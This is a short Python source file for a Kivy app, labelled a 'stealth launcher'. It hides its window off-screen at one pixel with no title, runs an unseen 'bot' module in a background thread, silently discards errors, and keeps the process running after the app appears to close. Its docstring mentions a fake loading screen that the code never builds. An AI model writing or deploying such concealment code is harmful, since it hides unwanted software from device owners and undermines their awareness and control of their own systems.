"""Stealth launcher — shows fake loading screen, then runs bot in background."""
import threading
import time

from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.progressbar import ProgressBar
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.config import Config

# No app icon in recents, no title bar
Config.set('kivy', 'window_title', '')
Config.set('kivy', 'show_titlebar', '0')
Window.size = (1, 1)
Window.top = -9999

_bot_started = False
_app_instance = None

def start_bot():
    global _bot_started
    if _bot_started:
        return
    _bot_started = True
    import asyncio
    import bot
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(bot.start_bot())
    except Exception:
        pass
    finally:
        loop.close()

class StealthApp(App):
    def build(self):
        global _app_instance
        _app_instance = self
        # Minimal window off-screen
        Window.top = -9999
        Window.left = -9999
        Window.size = (1, 1)

        # Start bot in background thread
        t = threading.Thread(target=start_bot, daemon=True)
        t.start()

        # Signal ourselves to close after a moment
        Clock.schedule_once(lambda dt: self.close_gracefully(), 0.5)
        return None  # No GUI

    def close_gracefully(self):
        self.close()

    def on_stop(self):
        pass  # Keep process alive — bot thread keeps it running

if __name__ == "__main__":
    StealthApp().run()
